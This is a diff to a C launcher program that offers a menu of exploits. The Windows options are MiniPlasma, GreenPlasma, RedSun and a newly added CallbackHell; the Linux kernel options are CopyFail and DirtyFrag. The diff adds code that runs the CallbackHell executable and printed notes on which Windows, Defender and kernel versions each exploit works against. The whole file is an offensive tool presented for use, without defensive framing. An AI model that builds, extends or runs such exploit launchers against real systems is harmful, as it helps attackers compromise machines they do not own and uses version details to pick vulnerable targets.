@@ -21,9 +21,11 @@ int showexploits() {
     int choice = 0;
 
     if (win == 1) {
-        printf("1.MiniPlasma Exploit\n");
-        printf("2.GreenPlasma Exploit\n");
-        printf("3.RedSun Exploit\n");
+        printf("1.MiniPlasma Exploit (Windows 10/11)\n");
+        printf("2.GreenPlasma Exploit (Windows 10/11)\n");
+        printf("3.RedSun Exploit (Windows 10/11)\n");
+        printf("4.CallbackHell Exploit (Windows 8/8.1)\n");
+        printf("For these to work your defender must be prior to version 4.18.26040.7\n");
         printf("\n");
         printf("Enter Choice : ");
         scanf("%d", &choice); 
@@ -32,6 +34,7 @@ int showexploits() {
         printf("1.CopyFail Exploit\n");
         printf("2.DirtyFrag Exploit\n");
         printf("3.DirtyFrag2 Exploit\n");
+        printf("These all work in kernel 4.14 up to 6.19.12 (except 6.12.85, 6.6.137, 6.1.170, 5.15.204, 5.10.254 and musl OSes.)\n");
         printf("\n");
         printf("Enter Choice : ");
         scanf("%d", &choice);
@@ -89,6 +92,15 @@ int main() {
         PROCESS_INFORMATION pi = { 0 };
         si.cb = sizeof(si);
         if (CreateProcessA("Exploits/Windows/RedSun.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    } else if (choice == 4) {
+        STARTUPINFOA si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+        si.cb = sizeof(si);
+        if (CreateProcessA("Exploits/Windows/CallbackHell.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
             WaitForSingleObject(pi.hProcess, INFINITE);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
